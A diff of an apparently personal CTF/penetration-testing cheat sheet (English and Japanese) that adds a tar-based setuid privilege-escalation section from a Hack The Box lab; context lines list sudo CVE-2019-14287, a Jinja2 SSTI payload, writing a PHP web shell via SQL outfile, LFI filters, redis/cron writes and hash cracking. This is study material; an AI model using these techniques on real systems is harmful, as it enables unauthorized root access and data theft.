@@ -44,6 +44,7 @@
       - copyright year
       - software version (CHANGELOG.txt ... etc)
     - searchsploit -j software | jq | egrep -C2  '(20XX|20XX)'
+    
   - kernel exploit
     - check kernel timestamp
     - check kernel version
@@ -51,6 +52,7 @@
     - check cpu arch
     - check module version (dpkg -l)
       - characteristic file name
+    
   - debug exploit
     - check script inputs
       - Is URL correct?
@@ -64,6 +66,7 @@
       - debugger
         - import pdb
         - pdb.set_trace()
+    
   - webpage
     - search page
       - http://example.com/hoo/1/bar
@@ -73,17 +76,20 @@
     - search password
     - search sub domains
     - search comments and hidden pages
+    
   - cron job
     - /var/spool/cron/
     - check the permissions and timestamp of the file if the script creates a file.
     - 'PATH' variable
       - /etc/crontab
       - /var/spool/cron/
+    
   - process
     - ps
     - pspy
       - "pspy -f" show files
     - cron
+    
   - groups
     - container
       - lxc
@@ -92,26 +98,32 @@
     - adm
       - aureport --tty
       - login, register, reset form in access.log
+    
   - files
     - check timestamps, owner and group.
       - alias ls='ls -la --time-style=iso'
     - directory without read permission but has write permission
+    
   - SUID / SGID
     - export PATH=$MY_PATH:$PATH
     - use ltrace to identify embedded commands
+    
   - SUDO
     - secure_path cannot be modified
     - CVE-2019-14287 
       - < sudo 1.8.28
       - ALL=(ALL,!root) /bin/something
       - sudo -u#-1 /bin/something
+    
   - write to a read only configure file
     - mv read_only_file my_file
     - echo 'new file' > read_only_file
+    
   - ssh
     - /etc/motd ... execute by root
     - if /usr/local is writable, allways success privsec
     - ssh-keygen -y -e -f private.key > public.key
+    
   - os command injection
     - sleep
     - ping
@@ -130,31 +142,39 @@
       - プロキシなどが間に存在し、リバースシェルが利用できないシーンで活用可能
     - [fstatic compile nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap)
       - 侵入したホストでnmapが必要になった時、使用する
+    
   - file transfer
     - nginxの場合、webdavを可能とするにはdav_methods PUT;のように設定
+    
   - fuzzing([ffuf](https://github.com/ffuf/ffuf))
   
     - ffuf -u http://example.com/test?param=FUZZ -w /opt/SecLists/Fuzzing/special-chars.txt -mc all
     - try comment out characters
       - for example, rua's comment out characters are --
       - ffuf -u http://example.com/test?param=FUZZ-- -w /opt/SecLists/Fuzzing/special-chars.txt -mc all
+    
   - shell (privsec)
     - chmod +s /bin/sh
       - sh -p
+    
   - ssti
     - jinja2
       - {{config.\_\_class\_\_.\_\_init\_\_.\_\_globals\_\_['os'].popen('code').read()}}
+    
   - deserialization
     - node.jsで入力がJsonでも、node-deserializeモジュールを利用していれば、デシリアライズに起因するバグが存在する可能性がある
     - nodejsshell.pyで、evalに基づくリバースシェルが可能
+    
   - environ
     - LD_PRELOAD
     - PYTHONPATH
       - python library path
+    
   - write file
     - authorized_keys
     - /var/www/html
     - /var/spool/cron
+    
   - docker
     - check another server
     - privilege?
@@ -163,17 +183,21 @@
       - capsh --print
     - enum
       - [deepce](https://github.com/stealthcopter/deepce)
+    
   - NetBSD
     - doas -u user command
       - same as su
+    
   - database
     - run as root
     - create a user defined function (mysql)
       - sys_exec
+    
   - redis
     - config set dir XXXX
     - config set dbfilename XXXX
     - save
+    
   - pwn
     - base address (No ASLR)
       - ldd bin
@@ -188,11 +212,13 @@
       - 例えばshでもよい
       - system("/tmp/hoge")のようなパスを指定し、/tmp/hogeに実行可能なシェルスクリプトを配置してもよい
       - PATHに適当に追加(Path Injection)し、system("hoo")でもよい
+    
   - wordlist
     - cewl
     - [username-anarchy](https://github.com/urbanadventurer/username-anarchy)
     -  hashcat --force passwords.txt -r /usr/share/hashcat/rules/best64.rule --stdout
       - echo password | hashcat -r /usr/share/hashcat/rules/best64.rule --stdout
+    
   - sql
     - almost cases, passwords are hex (hash values).
       - "abcdef0123456789$"
@@ -203,8 +229,10 @@
       - '/etc/passwd' is a client file
     - select '<?php ?>' into outfile '/var/www/html/shell.php';
       - '/var/www/html/shell.php' is a server file
+    
   - LFI
     - php://filter/convert.base64-encode/resource=file_name.php
+    
   - openssl
     - client certificate
       - generate  the private key
@@ -219,6 +247,7 @@
       - CER + private key => PKCS12
         - archive the key and crtificate.
         - openssl pkcs12 -export -inkey client.key -in client.cer -out client.p12
+    
   - hashcat
     - hashcat -a 0 -m hash_type hash.txt rockyou.txt
     
@@ -238,9 +267,31 @@
       Written 2 WPA Handshakes to: ../../captured.hccapx
       ```
     
-      
+  - tar
+    
+    - tarでは権限とオーナを保存できる
+    
+    - これを利用し、rootにsetuid付きのバイナリを解凍させる
+    
+    - ```console
+      ┌─[rio@parrot]─[~/Htb/TartarSauce]
+      └──╼ $tar cvf var.tar.gz var
+      var/
+      var/www/
+      var/www/html/
+      var/www/html/sh
+      ┌─[rio@parrot]─[~/Htb/TartarSauce]
+      └──╼ $tar tvf var.tar.gz
+      drwxr-xr-x root/root         0 2021-08-31 20:33 var/
+      drwxr-xr-x root/root         0 2021-08-31 20:33 var/www/
+      drwxr-xr-x root/root         0 2021-08-31 20:33 var/www/html/
+      -rwsr-sr-x root/root    173644 2021-08-31 20:33 var/www/html/sh
+      ```
+    
   - vhd
+    
     - 7z l image.vhd
+    
   - elasticsearch
     - search tables
       - curl http://target/_cat/indices
@@ -248,6 +299,7 @@
       - curl http://target/table_name/_count
     - dump all
       - curl http://target/table_name/_search?size=row_count
+    
   - vnc
     - パスワードファイルを解読可能
     - https://github.com/jeroennijhof/vncpwd
